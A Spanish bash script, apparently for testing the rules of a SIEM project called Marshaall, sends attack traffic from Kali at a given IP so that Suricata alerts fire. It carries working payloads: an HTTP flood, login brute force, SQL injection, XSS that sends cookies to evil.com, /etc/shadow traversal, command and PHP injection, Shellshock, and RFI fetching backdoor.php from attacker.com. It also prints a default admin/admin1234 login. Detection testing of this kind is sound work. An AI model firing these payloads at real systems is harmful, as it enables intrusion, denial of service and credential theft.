#!/bin/bash
# ============================================================
# Marshaall SIEM — Script de Pruebas de Ataque desde Kali Linux
# ============================================================
# Uso: sudo bash kali_ataques.sh <IP_TARGET>
# Ejemplo: sudo bash kali_ataques.sh 192.168.0.147
#
# Categorías de ataque (todas HTTP, visibles por Suricata en WSL2):
#   1. DoS HTTP Flood
#   2. Fuerza Bruta HTTP
#   3. Web Application Attacks
#   4. Exploits (User-Agents + payloads HTTP)
#
# Nota: Suricata en WSL2 solo ve tráfico HTTP (puerto 80) reenviado por NAT.
#       Paquetes raw (ICMP, SYN/NULL scans, UDP) no llegan a Suricata.
#
# Requisitos en Kali:
#   - curl, nmap, nikto (preinstalados en Kali)
#   - Adaptador de red en modo Bridge (misma subred que el target)
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Error: Debes proporcionar la IP del host target${NC}"
    echo "Uso: sudo $0 <IP_TARGET>"
    echo "Ejemplo: sudo $0 192.168.0.147"
    exit 1
fi

TARGET="$1"
HTTP_PORT=80

echo ""
echo -e "${CYAN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}${BOLD}║   MARSHAALL SIEM — GENERADOR DE ATAQUES DESDE KALI LINUX      ║${NC}"
echo -e "${CYAN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}  Target:  ${BOLD}$TARGET${NC}"
echo -e "${YELLOW}  Puerto HTTP: ${BOLD}$HTTP_PORT${NC}"
echo ""

# ── Verificar conectividad ───────────────────────────────────
echo -e "${BLUE}[0/4]${NC} Verificando conectividad con el target..."
if ping -c 2 -W 3 "$TARGET" > /dev/null 2>&1; then
    echo -e "${GREEN}  ✓ Host $TARGET alcanzable${NC}"
else
    echo -e "${RED}  ✗ No se puede alcanzar $TARGET. Verifica:${NC}"
    echo "    - Que Kali está en modo Bridge (misma red que el target)"
    echo "    - Que el firewall del host permite tráfico"
    echo "    - Que los contenedores Docker están corriendo"
    exit 1
fi

# Verificar que el puerto HTTP responde
if curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "http://$TARGET:$HTTP_PORT/" | grep -qE "^[23]"; then
    echo -e "${GREEN}  ✓ Servicio HTTP activo en puerto $HTTP_PORT${NC}"
else
    echo -e "${YELLOW}  ⚠ Puerto HTTP $HTTP_PORT no responde (algunos tests HTTP pueden fallar)${NC}"
fi
echo ""

# Tiempo de pausa entre categorías
PAUSE=3

# ═══════════════════════════════════════════════════════════════
# 1. DoS HTTP Flood
# ═══════════════════════════════════════════════════════════════
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║  1/4  DoS HTTP Flood                                        ║${NC}"
echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# 1a) HTTP Flood con curl (250 peticiones rápidas)
echo -e "${BLUE}  [1a]${NC} HTTP Flood (250 peticiones rápidas)..."
echo -e "${YELLOW}       → Regla: MARSHAALL DOS HTTP Flood detectado (SID 1000033)${NC}"
for i in $(seq 1 250); do
    curl -s -o /dev/null -m 2 "http://$TARGET:$HTTP_PORT/" &
    if (( i % 50 == 0 )); then
        wait
    fi
done
wait 2>/dev/null
echo -e "${GREEN}  ✓ HTTP Flood completado${NC}"

echo ""
sleep $PAUSE

# ═══════════════════════════════════════════════════════════════
# 2. Fuerza Bruta HTTP
# ═══════════════════════════════════════════════════════════════
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║  2/4  Fuerza Bruta HTTP                                     ║${NC}"
echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# 2a) HTTP Login Brute Force (15 intentos rápidos a /api/login)
echo -e "${BLUE}  [2a]${NC} Fuerza bruta HTTP Login (/api/login, 15 intentos)..."
echo -e "${YELLOW}       → Regla: SID 1000041 (HTTP Login Brute Force)${NC}"
for i in $(seq 1 15); do
    curl -s -o /dev/null -m 3 -X POST "http://$TARGET:$HTTP_PORT/api/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"wrong_pass_$i\"}" &
done
wait 2>/dev/null
echo -e "${GREEN}  ✓ HTTP Login Brute Force completado${NC}"
sleep 1

# 2b) HTTP POST excesivos (40 POST rápidos a distintas rutas)
echo -e "${BLUE}  [2b]${NC} HTTP POST excesivos (40 peticiones)..."
echo -e "${YELLOW}       → Regla: SID 1000045 (HTTP POST excesivos)${NC}"
for i in $(seq 1 40); do
    curl -s -o /dev/null -m 2 -X POST "http://$TARGET:$HTTP_PORT/api/events" \
        -H "Content-Type: application/json" \
        -d "{\"test\":\"brute_$i\"}" &
    if (( i % 20 == 0 )); then wait 2>/dev/null; fi
done
wait 2>/dev/null
echo -e "${GREEN}  ✓ HTTP POST excesivos completado${NC}"

echo ""
sleep $PAUSE

# ═══════════════════════════════════════════════════════════════
# 3. Web Application Attacks
# ═══════════════════════════════════════════════════════════════
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║  3/4  Web Application Attacks                               ║${NC}"
echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# 3a) SQL Injection payloads
echo -e "${BLUE}  [3a]${NC} SQL Injection (múltiples payloads)..."
echo -e "${YELLOW}       → Reglas: SID 1000050-1000054${NC}"
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL--" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?id=1%27%20OR%20%271%27=%271" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?id=1;%20DROP%20TABLE%20users--" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?id=1%27%20OR%201=1--" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?id=1%27%20AND%201=1--" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/search?q=admin%27%20UNION%20SELECT%20username,password%20FROM%20users--" &
# POST body SQLi
curl -s -o /dev/null -m 5 -X POST "http://$TARGET:$HTTP_PORT/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' UNION SELECT NULL,NULL,NULL--","password":"test"}' &
wait 2>/dev/null
echo -e "${GREEN}  ✓ SQL Injection payloads enviados${NC}"
sleep 1

# 3b) XSS payloads
echo -e "${BLUE}  [3b]${NC} Cross-Site Scripting (XSS)..."
echo -e "${YELLOW}       → Reglas: SID 1000055-1000058${NC}"
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?q=%3Cscript%3Ealert(1)%3C/script%3E" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?q=%3Cimg%20onerror=alert(1)%20src=x%3E" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?url=javascript:alert(document.cookie)" &
curl -s -o /dev/null -m 5 -X POST "http://$TARGET:$HTTP_PORT/" \
    -d "comment=<script>document.location='http://evil.com/steal?c='+document.cookie</script>" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ XSS payloads enviados${NC}"
sleep 1

# 3c) Directory Traversal / LFI
echo -e "${BLUE}  [3c]${NC} Directory Traversal y LFI..."
echo -e "${YELLOW}       → Reglas: SID 1000059-1000060${NC}"
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/../../../etc/passwd" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/..%2F..%2F..%2Fetc%2Fpasswd" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/page?file=../../../../etc/shadow" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?page=....//....//etc/passwd" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ Directory Traversal / LFI payloads enviados${NC}"
sleep 1

# 3d) Command Injection
echo -e "${BLUE}  [3d]${NC} Command Injection..."
echo -e "${YELLOW}       → Regla: SID 1000061${NC}"
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?cmd=;%20cat%20/etc/passwd" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?cmd=|%20id" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?cmd=%60whoami%60" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?ip=127.0.0.1;%20ls%20-la" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ Command Injection payloads enviados${NC}"
sleep 1

# 3e) Shellshock
echo -e "${BLUE}  [3e]${NC} Shellshock (CVE-2014-6271)..."
echo -e "${YELLOW}       → Regla: SID 1000066${NC}"
curl -s -o /dev/null -m 5 -H "User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'" \
    "http://$TARGET:$HTTP_PORT/" &
curl -s -o /dev/null -m 5 -H "Referer: () { :; }; echo vulnerable" \
    "http://$TARGET:$HTTP_PORT/" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ Shellshock payloads enviados${NC}"
sleep 1

# 3f) Scanners Web (Nikto)
echo -e "${BLUE}  [3f]${NC} Scanner Nikto..."
echo -e "${YELLOW}       → Regla: SID 1000062${NC}"
if command -v nikto &>/dev/null; then
    timeout 30 nikto -h "http://$TARGET:$HTTP_PORT" -Tuning 1 -maxtime 25s > /dev/null 2>&1 || true
    echo -e "${GREEN}  ✓ Nikto scan completado${NC}"
else
    # Simular User-Agent de Nikto
    curl -s -o /dev/null -m 5 -A "Nikto/2.1.6" "http://$TARGET:$HTTP_PORT/" || true
    curl -s -o /dev/null -m 5 -A "Nikto/2.5.0" "http://$TARGET:$HTTP_PORT/admin/" || true
    echo -e "${GREEN}  ✓ User-Agent Nikto simulado${NC}"
fi
sleep 1

# 3g) Scanners: sqlmap, gobuster, DirBuster UA
echo -e "${BLUE}  [3g]${NC} Simulando User-Agents de scanners..."
echo -e "${YELLOW}       → Reglas: SID 1000063-1000065, 1000068${NC}"
curl -s -o /dev/null -m 5 -A "sqlmap/1.7.2#stable" "http://$TARGET:$HTTP_PORT/?id=1" &
curl -s -o /dev/null -m 5 -A "DirBuster-1.0-RC1" "http://$TARGET:$HTTP_PORT/admin" &
curl -s -o /dev/null -m 5 -A "gobuster/3.6" "http://$TARGET:$HTTP_PORT/.git/" &
curl -s -o /dev/null -m 5 -A "wfuzz/3.1.0" "http://$TARGET:$HTTP_PORT/FUZZ" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ Scanner User-Agents enviados${NC}"

echo ""
sleep $PAUSE

# ═══════════════════════════════════════════════════════════════
# 4. Exploits y Metasploit
# ═══════════════════════════════════════════════════════════════
echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}${BOLD}║  4/4  Exploits                                              ║${NC}"
echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# 4a) Metasploit User-Agent
echo -e "${BLUE}  [4a]${NC} Simulando Metasploit User-Agent..."
echo -e "${YELLOW}       → Regla: SID 1000070${NC}"
curl -s -o /dev/null -m 5 -A "Mozilla/4.0 (compatible; Metasploit RSPEC)" "http://$TARGET:$HTTP_PORT/" &
curl -s -o /dev/null -m 5 -A "Metasploit/6.3" "http://$TARGET:$HTTP_PORT/" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ Metasploit UA enviado${NC}"
sleep 1

# 4b) Nmap NSE Scripts
echo -e "${BLUE}  [4b]${NC} Nmap NSE vulnerability scan..."
echo -e "${YELLOW}       → Regla: SID 1000071${NC}"
if command -v nmap &>/dev/null; then
    sudo nmap -sV --script=http-enum,http-headers,http-methods -p $HTTP_PORT "$TARGET" -T4 > /dev/null 2>&1 || true
    echo -e "${GREEN}  ✓ Nmap NSE completado${NC}"
else
    echo -e "${YELLOW}  ⚠ nmap no instalado${NC}"
fi
sleep 1

# 4c) PHP Code Injection
echo -e "${BLUE}  [4c]${NC} PHP Code Injection..."
echo -e "${YELLOW}       → Regla: SID 1000067${NC}"
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?page=<?php%20system('id');%20?>" &
curl -s -o /dev/null -m 5 -X POST "http://$TARGET:$HTTP_PORT/" \
    -d "data=<?php echo shell_exec('whoami'); ?>" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ PHP injection enviado${NC}"
sleep 1

# 4d) Remote File Inclusion
echo -e "${BLUE}  [4d]${NC} Remote File Inclusion (RFI)..."
echo -e "${YELLOW}       → Regla: SID 1000077${NC}"
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?page=http://evil.com/shell.php" &
curl -s -o /dev/null -m 5 "http://$TARGET:$HTTP_PORT/?include=http://attacker.com/backdoor.php" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ RFI payloads enviados${NC}"
sleep 1

# 4e) Pentest User-Agent (ZAP / Burp Suite)
echo -e "${BLUE}  [4e]${NC} Simulando User-Agents de pentesting (ZAP, Burp)..."
echo -e "${YELLOW}       → Regla: SID 1000079${NC}"
curl -s -o /dev/null -m 5 -A "OWASP ZAP/2.14.0" "http://$TARGET:$HTTP_PORT/" &
curl -s -o /dev/null -m 5 -A "Burp Suite Professional/2024.3" "http://$TARGET:$HTTP_PORT/admin" &
wait 2>/dev/null
echo -e "${GREEN}  ✓ Pentest UA enviado${NC}"

echo ""

# ═══════════════════════════════════════════════════════════════
# RESUMEN
# ═══════════════════════════════════════════════════════════════
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║  TODOS LOS ATAQUES COMPLETADOS                              ║${NC}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BOLD}26 reglas Suricata (HTTP) — cada test produce exactamente la alerta indicada:${NC}"
echo ""
echo -e "${RED}  DoS (1 regla):${NC}"
echo "    • HTTP Flood        (SID 1000033)    ← test 1a"
echo ""
echo -e "${RED}  Fuerza Bruta (2 reglas):${NC}"
echo "    • HTTP Login         (SID 1000041)    ← test 2a"
echo "    • HTTP POST excesivo (SID 1000045)    ← test 2b"
echo ""
echo -e "${RED}  Web Attacks (19 reglas):${NC}"
echo "    • SQL Injection x5  (SID 1000050-54)  ← test 3a"
echo "    • XSS x4            (SID 1000055-58)  ← test 3b"
echo "    • Dir Traversal x2  (SID 1000059-60)  ← test 3c"
echo "    • Cmd Injection     (SID 1000061)     ← test 3d"
echo "    • Shellshock        (SID 1000066)     ← test 3e"
echo "    • Scanners x5      (SID 1000062-68)  ← test 3f+3g"
echo "    • PHP Injection     (SID 1000067)     ← test 4c"
echo ""
echo -e "${RED}  Exploits (4 reglas):${NC}"
echo "    • Metasploit UA     (SID 1000070)     ← test 4a"
echo "    • Nmap NSE UA       (SID 1000071)     ← test 4b"
echo "    • RFI               (SID 1000077)     ← test 4d"
echo "    • Pentest UA        (SID 1000079)     ← test 4e"
echo ""
echo -e "${CYAN}${BOLD}  Dashboard:${NC} http://$TARGET  (admin / admin1234)"
echo ""
echo -e "${BOLD}  Verificar en el host:${NC}"
echo "    # Ver alertas en tiempo real:"
echo "    sudo tail -f /var/log/suricata/eve.json | grep '\"event_type\":\"alert\"'"
echo ""
echo "    # Contar alertas generadas:"
echo "    grep -c '\"event_type\":\"alert\"' /var/log/suricata/eve.json"
echo ""
echo "    # Ver logs de ingesta:"
echo "    docker logs -f marshaall-ingest --tail 50"
echo ""
